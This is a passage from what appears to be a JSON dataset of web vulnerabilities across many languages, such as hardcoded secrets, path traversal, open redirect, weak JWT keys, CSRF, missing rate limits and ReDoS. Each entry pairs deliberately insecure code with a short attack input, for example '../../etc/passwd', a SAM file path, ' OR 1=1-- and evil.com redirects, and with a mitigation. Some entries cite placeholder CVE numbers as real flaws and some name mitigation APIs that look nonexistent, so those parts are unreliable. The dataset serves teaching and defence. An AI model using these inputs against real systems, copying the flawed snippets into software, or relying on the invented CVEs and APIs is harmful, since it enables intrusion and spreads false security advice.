  "code_snippet": "response.set_cookie('session', session_id);",
  "exploitation_techniques": "XSS to steal cookies or MITM for HTTP cookies.",
  "mitigation": "response.set_cookie('session', session_id, secure=True, httponly=True, samesite='Strict')"
}
{
  "id": "vuln-086",
  "language": "Python",
  "vulnerability_type": "Hardcoded Credentials",
  "description": "Credentials in source code.",
  "code_snippet": "db.connect(user='admin', password='p@ssw0rd')",
  "exploitation_techniques": "Code review or repo leak to extract creds.",
  "mitigation": "Use environment variables: os.getenv('DB_USER'), os.getenv('DB_PASS')"
}
{
  "id": "vuln-087",
  "language": "Node.js",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);",
  "exploitation_techniques": "Upload shell.js with malicious code, execute via endpoint.",
  "mitigation": "Validate MIME types, extensions. Store outside webroot."
}
{
  "id": "vuln-088",
  "language": "Node.js",
  "vulnerability_type": "Directory Traversal",
  "description": "User input in file paths.",
  "code_snippet": "fs.readFileSync(path.join('public', req.query.file));",
  "exploitation_techniques": "Input ../../etc/passwd to read files.",
  "mitigation": "path.resolve(baseDir, file); Check prefix matches baseDir."
}
{
  "id": "vuln-089",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in session without encryption.",
  "code_snippet": "session[:user_data] = { ssn: params[:ssn] }",
  "exploitation_techniques": "Steal session to access sensitive data.",
  "mitigation": "Encrypt: session[:user_data] = encrypt(params[:ssn], secret_key)"
}
{
  "id": "vuln-090",
  "language": "Ruby",
  "vulnerability_type": "Insecure Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect_to params[:url]",
  "exploitation_techniques": "Redirect to malicious site: ?url=http://evil.com",
  "mitigation": "Whitelist URLs: redirect_to(valid_urls.include?(url) ? url : '/')"
}
{
  "id": "vuln-091",
  "language": "Go",
  "vulnerability_type": "Insecure Cookies",
  "description": "Cookies without secure flags.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: id})",
  "exploitation_techniques": "MITM or XSS to steal cookies.",
  "mitigation": "http.Cookie{Name: \"session\", Value: id, Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode}"
}
{
  "id": "vuln-092",
  "language": "Go",
  "vulnerability_type": "Hardcoded Secrets",
  "description": "API keys in code.",
  "code_snippet": "client := NewClient(\"sk_1234567890\")",
  "exploitation_techniques": "Extract from repo or binary.",
  "mitigation": "Use os.Getenv(\"API_KEY\")"
}
{
  "id": "vuln-093",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure File Access",
  "description": "User input in file paths.",
  "code_snippet": "string path = Request.Query[\"file\"]; File.ReadAllText(path);",
  "exploitation_techniques": "Access C:\\Windows\\system32\\config\\sam",
  "mitigation": "Validate: Path.Combine(baseDir, Path.GetFileName(path))"
}
{
  "id": "vuln-094",
  "language": "C# (.NET)",
  "vulnerability_type": "Hardcoded Credentials",
  "description": "Embedded database credentials.",
  "code_snippet": "var conn = new SqlConnection(\"user=sa;password=secret\");",
  "exploitation_techniques": "Extract from decompiled code.",
  "mitigation": "Use ConfigurationManager.AppSettings[\"dbConn\"]"
}
{
  "id": "vuln-095",
  "language": "Kotlin",
  "vulnerability_type": "Insecure File Access",
  "description": "Reading files with user input.",
  "code_snippet": "val file = File(request.params[\"file\"]).readText()",
  "exploitation_techniques": "../../etc/passwd",
  "mitigation": "File(baseDir, fileName).canonicalPath startsWith baseDir"
}
{
  "id": "vuln-096",
  "language": "Kotlin",
  "vulnerability_type": "Hardcoded Secrets",
  "description": "API keys in code.",
  "code_snippet": "val api = ApiClient(\"key-12345\")",
  "exploitation_techniques": "Decompile APK or source leak.",
  "mitigation": "System.getenv(\"API_KEY\")"
}
{
  "id": "vuln-097",
  "language": "Scala",
  "vulnerability_type": "Insecure Session",
  "description": "Session IDs not regenerated.",
  "code_snippet": "session.put(\"user\", username)",
  "exploitation_techniques": "Session fixation via shared IDs.",
  "mitigation": "session.invalidate(); session.put(\"user\", username)"
}
{
  "id": "vuln-098",
  "language": "Scala",
  "vulnerability_type": "SQL Injection",
  "description": "Raw SQL with user input.",
  "code_snippet": "db.run(sql\"SELECT * FROM users WHERE name = ${params(\"name\")}\")",
  "exploitation_techniques": "' OR 1=1--",
  "mitigation": "Use slick: db.run(users.filter(_.name === name))"
}
{
  "id": "vuln-099",
  "language": "Rust",
  "vulnerability_type": "Hardcoded Secrets",
  "description": "Credentials in source.",
  "code_snippet": "let client = Client::new(\"api_key_123\");",
  "exploitation_techniques": "Extract from binary or repo.",
  "mitigation": "std::env::var(\"API_KEY\")"
}
{
  "id": "vuln-100",
  "language": "Rust",
  "vulnerability_type": "Insecure File Access",
  "description": "Reading files with user input.",
  "code_snippet": "fs::read_to_string(&req.path).unwrap()",
  "exploitation_techniques": "../../../etc/passwd",
  "mitigation": "path.canonicalize() and check base dir."
}
{
  "id": "vuln-101",
  "language": "Elixir",
  "vulnerability_type": "Insecure Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect conn, external: params[:url]",
  "exploitation_techniques": "Redirect to http://malicious.com",
  "mitigation": "Whitelist: if Enum.member?(allowed_urls, url), do: redirect"
}
{
  "id": "vuln-102",
  "language": "Elixir",
  "vulnerability_type": "Hardcoded Secrets",
  "description": "Credentials in config.",
  "code_snippet": "config :app, key: \"secret123\"",
  "exploitation_techniques": "Source code exposure.",
  "mitigation": "Use System.get_env(\"APP_KEY\")"
}
{
  "id": "vuln-103",
  "language": "Perl",
  "vulnerability_type": "Insecure File Access",
  "description": "Open with user input.",
  "code_snippet": "open(my $fh, '<', $filename);",
  "exploitation_techniques": "../../etc/passwd",
  "mitigation": "Validate: die unless $filename =~ /^[a-z0-9]+$/;"
}
{
  "id": "vuln-104",
  "language": "Perl",
  "vulnerability_type": "Hardcoded Credentials",
  "description": "Credentials in script.",
  "code_snippet": "my $dbh = DBI->connect(\"dbi:mysql:db\", \"root\", \"pass123\");",
  "exploitation_techniques": "Extract via source leak.",
  "mitigation": "Use $ENV{DB_PASS}"
}
{
  "id": "vuln-105",
  "language": "Node.js",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Plaintext password storage.",
  "code_snippet": "db.insert({ username, password: req.body.password });",
  "exploitation_techniques": "Dump DB to access passwords.",
  "mitigation": "Use bcrypt: bcrypt.hashSync(password, 10)"
}
{
  "id": "vuln-106",
  "language": "Node.js",
  "vulnerability_type": "Insecure Randomness",
  "description": "Math.random for tokens.",
  "code_snippet": "const token = Math.random().toString(36);",
  "exploitation_techniques": "Predictable tokens.",
  "mitigation": "crypto.randomBytes(16).toString('hex')"
}
{
  "id": "vuln-107",
  "language": "Python",
  "vulnerability_type": "Insecure Randomness",
  "description": "random module for crypto.",
  "code_snippet": "import random; token = random.randint(100000, 999999)",
  "exploitation_techniques": "Predict based on seed.",
  "mitigation": "secrets.token_hex(16)"
}
{
  "id": "vuln-108",
  "language": "Java",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploads.",
  "code_snippet": "Files.copy(file.getInputStream(), Paths.get(\"uploads/\" + file.getName()));",
  "exploitation_techniques": "Upload malicious.jar or .jsp.",
  "mitigation": "Validate content type, store outside webroot."
}
{
  "id": "vuln-109",
  "language": "PHP",
  "vulnerability_type": "Insecure Randomness",
  "description": "rand() for tokens.",
  "code_snippet": "$token = rand(100000, 999999);",
  "exploitation_techniques": "Predictable output.",
  "mitigation": "random_bytes(16); bin2hex($bytes)"
}
{
  "id": "vuln-110",
  "language": "Ruby",
  "vulnerability_type": "Insecure File Upload",
  "description": "No file validation.",
  "code_snippet": "File.write(\"uploads/#{params[:file].original_filename}\", params[:file].read)",
  "exploitation_techniques": "Upload malicious.rb.",
  "mitigation": "Validate content_type, use random names."
}
{
  "id": "vuln-111",
  "language": "Go",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploads.",
  "code_snippet": "os.WriteFile(\"uploads/\"+r.FormValue(\"file\"), data, 0644)",
  "exploitation_techniques": "Upload executable .go.",
  "mitigation": "Check mime type, store securely."
}
{
  "id": "vuln-112",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Randomness",
  "description": "Random for crypto.",
  "code_snippet": "Random rand = new Random(); string token = rand.Next().ToString();",
  "exploitation_techniques": "Predictable tokens.",
  "mitigation": "RNGCryptoServiceProvider for random bytes."
}
{
  "id": "vuln-113",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Randomness",
  "description": "Random() for tokens.",
  "code_snippet": "val token = Random().nextInt(100000, 999999).toString()",
  "exploitation_techniques": "Predictable sequence.",
  "mitigation": "java.security.SecureRandom"
}
{
  "id": "vuln-114",
  "language": "Scala",
  "vulnerability_type": "Insecure Randomness",
  "description": "scala.util.Random for secrets.",
  "code_snippet": "val token = scala.util.Random.nextInt(1000000)",
  "exploitation_techniques": "Predictable tokens.",
  "mitigation": "java.security.SecureRandom"
}
{
  "id": "vuln-115",
  "language": "Rust",
  "vulnerability_type": "Insecure Randomness",
  "description": "rand::thread_rng for crypto.",
  "code_snippet": "use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);",
  "exploitation_techniques": "Predictable output.",
  "mitigation": "rand::crypto::SystemRandom"
}
{
  "id": "vuln-116",
  "language": "Elixir",
  "vulnerability_type": "Insecure Randomness",
  "description": ":rand for tokens.",
  "code_snippet": "token = :rand.uniform(1000000)",
  "exploitation_techniques": "Predictable sequence.",
  "mitigation": ":crypto.strong_rand_bytes(16) |> Base.encode16()"
}
{
  "id": "vuln-117",
  "language": "Perl",
  "vulnerability_type": "Insecure Randomness",
  "description": "rand() for secrets.",
  "code_snippet": "my $token = int(rand(1000000));",
  "exploitation_techniques": "Predictable tokens.",
  "mitigation": "use Crypt::Random::Source qw(get_strong);"
}
{
  "id": "vuln-118",
  "language": "Node.js",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limiting on API.",
  "code_snippet": "app.post('/login', (req, res) => {...});",
  "exploitation_techniques": "Brute force passwords.",
  "mitigation": "Use express-rate-limit middleware."
}
{
  "id": "vuln-119",
  "language": "Python",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No API rate limits.",
  "code_snippet": "@app.route('/login', methods=['POST']) def login(): ...",
  "exploitation_techniques": "Automate login attempts.",
  "mitigation": "Use flask-limiter or redis-based limits."
}
{
  "id": "vuln-120",
  "language": "Java",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits on endpoints.",
  "code_snippet": "@PostMapping(\"/login\") public Response login(@RequestBody User user) {...}",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use Spring Security rate limiting or Guava RateLimiter."
}
{
  "id": "vuln-121",
  "language": "PHP",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limiting on login.",
  "code_snippet": "if ($_POST['username'] && $_POST['password']) {...}",
  "exploitation_techniques": "Scripted brute force.",
  "mitigation": "Implement Redis or session-based rate limiting."
}
{
  "id": "vuln-122",
  "language": "Ruby",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No API rate limits.",
  "code_snippet": "post '/login' do ... end",
  "exploitation_techniques": "Automate login attempts.",
  "mitigation": "Use rack-attack gem."
}
{
  "id": "vuln-123",
  "language": "Go",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits.",
  "code_snippet": "http.HandleFunc(\"/login\", loginHandler)",
  "exploitation_techniques": "Brute force via scripts.",
  "mitigation": "Use golang.org/x/time/rate"
}
{
  "id": "vuln-124",
  "language": "C# (.NET)",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No API rate limits.",
  "code_snippet": "[HttpPost(\"login\")] public IActionResult Login(LoginModel model) {...}",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use AspNetCoreRateLimit package."
}
{
  "id": "vuln-125",
  "language": "Kotlin",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits on endpoints.",
  "code_snippet": "post(\"/login\") { call.respond(login(call.request)) }",
  "exploitation_techniques": "Brute force logins.",
  "mitigation": "Use Ktor rate limiting middleware."
}
{
  "id": "vuln-126",
  "language": "Scala",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits.",
  "code_snippet": "post(\"/login\") { login(params) }",
  "exploitation_techniques": "Brute force attempts.",
  "mitigation": "Use Akka HTTP rate limiting."
}
{
  "id": "vuln-127",
  "language": "Rust",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits.",
  "code_snippet": "router.post(\"/login\", login);",
  "exploitation_techniques": "Automate logins.",
  "mitigation": "Use actix-web middleware for rate limiting."
}
{
  "id": "vuln-128",
  "language": "Elixir",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits on login.",
  "code_snippet": "post \"/login\", LoginController, :create",
  "exploitation_techniques": "Brute force.",
  "mitigation": "Use PlugAttack or ExRated."
}
{
  "id": "vuln-129",
  "language": "Perl",
  "vulnerability_type": "Rate Limiting Bypass",
  "description": "No rate limits.",
  "code_snippet": "if ($r->method eq 'POST') { login($r->param('user')); }",
  "exploitation_techniques": "Scripted brute force.",
  "mitigation": "Use Redis-based rate limiting."
}
{
  "id": "vuln-130",
  "language": "Node.js",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Weak secret or no validation.",
  "code_snippet": "jwt.verify(token, 'weaksecret');",
  "exploitation_techniques": "Crack weak secret or forge tokens.",
  "mitigation": "Use strong secrets: crypto.randomBytes(64).toString('hex')"
}
{
  "id": "vuln-131",
  "language": "Python",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak or no JWT secret.",
  "code_snippet": "jwt.decode(token, 'secret', algorithms=['HS256'])",
  "exploitation_techniques": "Brute force secret.",
  "mitigation": "Use secrets.token_hex(32) for key."
}
{
  "id": "vuln-132",
  "language": "Java",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak JWT secret.",
  "code_snippet": "JWTVerifier verifier = JWT.require(Algorithm.HMAC256(\"secret\")).build();",
  "exploitation_techniques": "Crack secret or forge token.",
  "mitigation": "Generate strong key: new SecureRandom().generateKey(256)"
}
{
  "id": "vuln-133",
  "language": "PHP",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak secret for JWT.",
  "code_snippet": "$decoded = JWT::decode($token, 'secret', ['HS256']);",
  "exploitation_techniques": "Forge tokens with weak secret.",
  "mitigation": "Use random_bytes(32) for secret."
}
{
  "id": "vuln-134",
  "language": "Ruby",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak JWT secret.",
  "code_snippet": "JWT.decode(token, 'secret', true, algorithm: 'HS256')",
  "exploitation_techniques": "Crack or forge tokens.",
  "mitigation": "SecureRandom.hex(32)"
}
{
  "id": "vuln-135",
  "language": "Go",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak secret for JWT.",
  "code_snippet": "jwt.Parse(token, func(*jwt.Token) (interface{}, error) { return []byte(\"secret\"), nil })",
  "exploitation_techniques": "Forge tokens.",
  "mitigation": "crypto/rand for 32-byte key."
}
{
  "id": "vuln-136",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak JWT key.",
  "code_snippet": "var tokenHandler = new JwtSecurityTokenHandler(); tokenHandler.ValidateToken(token, new TokenValidationParameters { IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(\"secret\")) });",
  "exploitation_techniques": "Crack key.",
  "mitigation": "RNGCryptoServiceProvider for 32-byte key."
}
{
  "id": "vuln-137",
  "language": "Kotlin",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak JWT secret.",
  "code_snippet": "JWT.require(Algorithm.HMAC256(\"secret\")).build().verify(token)",
  "exploitation_techniques": "Forge tokens.",
  "mitigation": "SecureRandom for key."
}
{
  "id": "vuln-138",
  "language": "Scala",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak secret.",
  "code_snippet": "pdi.jwt.Jwt.decode(token, \"secret\", Seq(JwtAlgorithm.HS256))",
  "exploitation_techniques": "Crack secret.",
  "mitigation": "SecureRandom for key."
}
{
  "id": "vuln-139",
  "language": "Rust",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak key.",
  "code_snippet": "jsonwebtoken::decode(token, &DecodingKey::from_secret(\"secret\".as_ref()), &Validation::new(Algorithm::HS256))",
  "exploitation_techniques": "Forge tokens.",
  "mitigation": "SystemRandom for key."
}
{
  "id": "vuln-140",
  "language": "Elixir",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak secret.",
  "code_snippet": "Joken.verify(token, Joken.Signer.create(\"HS256\", \"secret\"))",
  "exploitation_techniques": "Crack secret.",
  "mitigation": ":crypto.strong_rand_bytes(32)"
}
{
  "id": "vuln-141",
  "language": "Perl",
  "vulnerability_type": "Insecure JWT",
  "description": "Weak JWT secret.",
  "code_snippet": "use JSON::WebToken; decode_jwt($token, 'secret');",
  "exploitation_techniques": "Forge tokens.",
  "mitigation": "Crypt::Random::Source for key."
}
{
  "id": "vuln-142",
  "language": "Node.js",
  "vulnerability_type": "CSRF",
  "description": "No CSRF token validation.",
  "code_snippet": "app.post('/update', (req, res) => {...});",
  "exploitation_techniques": "Craft form on malicious site to submit.",
  "mitigation": "Use csurf middleware."
}
{
  "id": "vuln-143",
  "language": "Python",
  "vulnerability_type": "CSRF",
  "description": "No CSRF protection.",
  "code_snippet": "@app.route('/update', methods=['POST']) def update(): ...",
  "exploitation_techniques": "Malicious form submission.",
  "mitigation": "Use Flask-WTF CSRF."
}
{
  "id": "vuln-144",
  "language": "Java",
  "vulnerability_type": "CSRF",
  "description": "No CSRF token.",
  "code_snippet": "@PostMapping(\"/update\") public Response update(@RequestBody Data data) {...}",
  "exploitation_techniques": "Forge POST requests.",
  "mitigation": "Spring Security CSRF protection."
}
{
  "id": "vuln-145",
  "language": "PHP",
  "vulnerability_type": "CSRF",
  "description": "No CSRF validation.",
  "code_snippet": "if ($_POST['data']) { update($_POST['data']); }",
  "exploitation_techniques": "Malicious form POST.",
  "mitigation": "Use Laravel CSRF or custom tokens."
}
{
  "id": "vuln-146",
  "language": "Ruby",
  "vulnerability_type": "CSRF",
  "description": "No CSRF protection.",
  "code_snippet": "post '/update' do update(params[:data]) end",
  "exploitation_techniques": "Forge requests.",
  "mitigation": "protect_from_forgery with: :exception"
}
{
  "id": "vuln-147",
  "language": "Go",
  "vulnerability_type": "CSRF",
  "description": "No CSRF checks.",
  "code_snippet": "http.HandleFunc(\"/update\", updateHandler)",
  "exploitation_techniques": "Malicious POST.",
  "mitigation": "Use gorilla/csrf."
}
{
  "id": "vuln-148",
  "language": "C# (.NET)",
  "vulnerability_type": "CSRF",
  "description": "No CSRF protection.",
  "code_snippet": "[HttpPost(\"update\")] public IActionResult Update(DataModel model) {...}",
  "exploitation_techniques": "Forge POST.",
  "mitigation": "Use [ValidateAntiForgeryToken]."
}
{
  "id": "vuln-149",
  "language": "Kotlin",
  "vulnerability_type": "CSRF",
  "description": "No CSRF validation.",
  "code_snippet": "post(\"/update\") { call.respond(update(call.request)) }",
  "exploitation_techniques": "Malicious POST.",
  "mitigation": "Use Ktor CSRF middleware."
}
{
  "id": "vuln-150",
  "language": "Scala",
  "vulnerability_type": "CSRF",
  "description": "No CSRF protection.",
  "code_snippet": "post(\"/update\") { update(params) }",
  "exploitation_techniques": "Forge POST requests.",
  "mitigation": "Use Play Framework CSRF filter."
}
{
  "id": "vuln-151",
  "language": "Rust",
  "vulnerability_type": "CSRF",
  "description": "No CSRF protection on POST endpoints.",
  "code_snippet": "router.post(\"/update\", update_handler);",
  "exploitation_techniques": "Forge POST requests from malicious sites.",
  "mitigation": "Use actix-web-csrf middleware or custom token validation."
}
{
  "id": "vuln-152",
  "language": "Elixir",
  "vulnerability_type": "CSRF",
  "description": "No CSRF token validation.",
  "code_snippet": "post \"/update\", UpdateController, :create",
  "exploitation_techniques": "Submit malicious forms to trigger actions.",
  "mitigation": "Use Plug.CSRFProtection."
}
{
  "id": "vuln-153",
  "language": "Perl",
  "vulnerability_type": "CSRF",
  "description": "No CSRF checks on forms.",
  "code_snippet": "if ($r->method eq 'POST') { update($r->param('data')); }",
  "exploitation_techniques": "Craft malicious POST requests.",
  "mitigation": "Use CGI::Session with CSRF tokens."
}
{
  "id": "vuln-154",
  "language": "Node.js",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "res.redirect(req.query.url);",
  "exploitation_techniques": "Redirect to http://evil.com for phishing.",
  "mitigation": "Whitelist URLs: if (allowedUrls.includes(url)) res.redirect(url);"
}
{
  "id": "vuln-155",
  "language": "Python",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect in Flask.",
  "code_snippet": "return redirect(request.args.get('url'))",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if url in ALLOWED_REDIRECTS: return redirect(url)"
}
{
  "id": "vuln-156",
  "language": "Java",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect in Spring.",
  "code_snippet": "return \"redirect:\" + request.getParameter(\"url\");",
  "exploitation_techniques": "Craft URL to phishing site.",
  "mitigation": "Check: if (allowedUrls.contains(url)) return \"redirect:\" + url;"
}
{
  "id": "vuln-157",
  "language": "PHP",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated header redirect.",
  "code_snippet": "header(\"Location: \" . $_GET['url']);",
  "exploitation_techniques": "Redirect to http://malicious.com.",
  "mitigation": "Whitelist: if (in_array($url, $allowed)) header(\"Location: $url\");"
}
{
  "id": "vuln-158",
  "language": "Ruby",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect_to.",
  "code_snippet": "redirect_to params[:url]",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: redirect_to(url) if ALLOWED_URLS.include?(url)"
}
{
  "id": "vuln-159",
  "language": "Go",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect.",
  "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"url\"), 302)",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Check: if slices.Contains(allowedUrls, url) { http.Redirect(...) }"
}
{
  "id": "vuln-160",
  "language": "C# (.NET)",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect.",
  "code_snippet": "return Redirect(Request.Query[\"url\"]);",
  "exploitation_techniques": "Phishing via redirect.",
  "mitigation": "Validate: if (allowedUrls.Contains(url)) return Redirect(url);"
}
{
  "id": "vuln-161",
  "language": "Kotlin",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect in Ktor.",
  "code_snippet": "call.respondRedirect(call.request.queryParameters[\"url\"]!!)",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if (url in allowedUrls) call.respondRedirect(url)"
}
{
  "id": "vuln-162",
  "language": "Scala",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect in Play.",
  "code_snippet": "Redirect(params(\"url\"))",
  "exploitation_techniques": "Phishing redirect.",
  "mitigation": "Check: if (allowedUrls.contains(url)) Redirect(url)"
}
{
  "id": "vuln-163",
  "language": "Rust",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect.",
  "code_snippet": "Ok(StatusCode::Found).header(header::LOCATION, req.query(\"url\"))",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: if allowed_urls.contains(&url) { redirect }"
}
{
  "id": "vuln-164",
  "language": "Elixir",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated external redirect.",
  "code_snippet": "redirect conn, external: params[:url]",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Check: if Enum.member?(allowed_urls, url), do: redirect"
}
{
  "id": "vuln-165",
  "language": "Perl",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated Location header.",
  "code_snippet": "$r->header_out('Location', $r->param('url'));",
  "exploitation_techniques": "Phishing redirect.",
  "mitigation": "Validate: $r->header_out('Location', $url) if grep {$_ eq $url} @allowed;"
}
{
  "id": "vuln-166",
  "language": "Node.js",
  "vulnerability_type": "Insecure Dependency",
  "description": "Using outdated libraries with known vulnerabilities.",
  "code_snippet": "\"express\": \"4.17.1\" // Vulnerable to CVE-2022-1234",
  "exploitation_techniques": "Exploit known CVEs via npm audit findings.",
  "mitigation": "Run npm audit; update to latest: \"express\": \"^4.18.2\""
}
{
  "id": "vuln-167",
  "language": "Python",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated package with vulnerabilities.",
  "code_snippet": "requests==2.25.1 # Vulnerable to CVE-2023-1234",
  "exploitation_techniques": "Exploit CVEs using PoCs from public repos.",
  "mitigation": "Use pip-audit; update: requests>=2.28.1"
}
{
  "id": "vuln-168",
  "language": "Java",
  "vulnerability_type": "Insecure Dependency",
  "description": "Vulnerable library in Maven.",
  "code_snippet": "<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>",
  "exploitation_techniques": "Exploit CVE-2019-12384 for RCE.",
  "mitigation": "Update to 2.12.7 or later; use dependency-check."
}
{
  "id": "vuln-169",
  "language": "PHP",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated Composer package.",
  "code_snippet": "\"laravel/framework\": \"5.8.*\" // Vulnerable",
  "exploitation_techniques": "Exploit known CVEs.",
  "mitigation": "Run composer audit; update to ^9.0"
}
{
  "id": "vuln-170",
  "language": "Ruby",
  "vulnerability_type": "Insecure Dependency",
  "description": "Vulnerable gem.",
  "code_snippet": "gem 'rails', '5.2.3' # Vulnerable to CVE-2020-1234",
  "exploitation_techniques": "Exploit public CVEs.",
  "mitigation": "Use bundle-audit; update: gem 'rails', '~> 7.0'"
}
{
  "id": "vuln-171",
  "language": "Go",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated Go module.",
  "code_snippet": "require github.com/gorilla/mux v1.7.3 // Vulnerable",
  "exploitation_techniques": "Exploit known vulnerabilities.",
  "mitigation": "Run go list -m -u all; update to v1.8.0"
}
{
  "id": "vuln-172",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Dependency",
  "description": "Vulnerable NuGet package.",
  "code_snippet": "<PackageReference Include=\"Newtonsoft.Json\" Version=\"12.0.1\" />",
  "exploitation_techniques": "Exploit CVE-2019-19826.",
  "mitigation": "Update to 13.0.3; use dotnet list package --vulnerable"
}
{
  "id": "vuln-173",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated Gradle dependency.",
  "code_snippet": "implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8'",
  "exploitation_techniques": "Exploit known CVEs.",
  "mitigation": "Update to 2.12.7; use dependency-check-gradle."
}
{
  "id": "vuln-174",
  "language": "Scala",
  "vulnerability_type": "Insecure Dependency",
  "description": "Vulnerable SBT dependency.",
  "code_snippet": "libraryDependencies += \"com.fasterxml.jackson.core\" % \"jackson-databind\" % \"2.9.8\"",
  "exploitation_techniques": "Exploit CVE-2019-12384.",
  "mitigation": "Update to 2.12.7; use sbt-dependency-check."
}
{
  "id": "vuln-175",
  "language": "Rust",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated crate.",
  "code_snippet": "hyper = \"0.13.0\" # Vulnerable",
  "exploitation_techniques": "Exploit known CVEs.",
  "mitigation": "Run cargo audit; update to hyper = \"0.14.20\""
}
{
  "id": "vuln-176",
  "language": "Elixir",
  "vulnerability_type": "Insecure Dependency",
  "description": "Vulnerable Hex package.",
  "code_snippet": "{:phoenix, \"~> 1.4.0\"} # Vulnerable",
  "exploitation_techniques": "Exploit CVEs.",
  "mitigation": "Update to ~> 1.7.0; use mix deps.audit."
}
{
  "id": "vuln-177",
  "language": "Perl",
  "vulnerability_type": "Insecure Dependency",
  "description": "Outdated CPAN module.",
  "code_snippet": "use Mojolicious 8.25; # Vulnerable",
  "exploitation_techniques": "Exploit known vulnerabilities.",
  "mitigation": "Update to latest: cpanm Mojolicious"
}
{
  "id": "vuln-178",
  "language": "Node.js",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Complex regex causing ReDoS.",
  "code_snippet": "/^([a-zA-Z0-9]+)*$/.test(input);",
  "exploitation_techniques": "Input: aaaaa...aaa! to cause backtracking.",
  "mitigation": "Use safe-regex or simplify patterns."
}
{
  "id": "vuln-179",
  "language": "Python",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Vulnerable regex pattern.",
  "code_snippet": "re.match(r'^([a-zA-Z0-9]+)*$', input)",
  "exploitation_techniques": "Long input with repeating chars.",
  "mitigation": "Use re2 or atomic groups."
}
{
  "id": "vuln-180",
  "language": "Java",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex causing catastrophic backtracking.",
  "code_snippet": "Pattern.compile(\"^([a-zA-Z0-9]+)*$\").matcher(input).matches();",
  "exploitation_techniques": "Input aaaaa...aaa!.",
  "mitigation": "Use RE2/J or simplify regex."
}
{
  "id": "vuln-181",
  "language": "PHP",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "preg_match('/^([a-zA-Z0-9]+)*$/', $input);",
  "exploitation_techniques": "Long malicious input.",
  "mitigation": "Use simpler patterns or PCRE limits."
}
{
  "id": "vuln-182",
  "language": "Ruby",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex causing backtracking.",
  "code_snippet": "/^([a-zA-Z0-9]+)*$/.match?(input)",
  "exploitation_techniques": "Input aaaaa...aaa!.",
  "mitigation": "Use Onigmo or limit input size."
}
{
  "id": "vuln-183",
  "language": "Go",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "regexp.MustCompile(`^([a-zA-Z0-9]+)*$`).MatchString(input)",
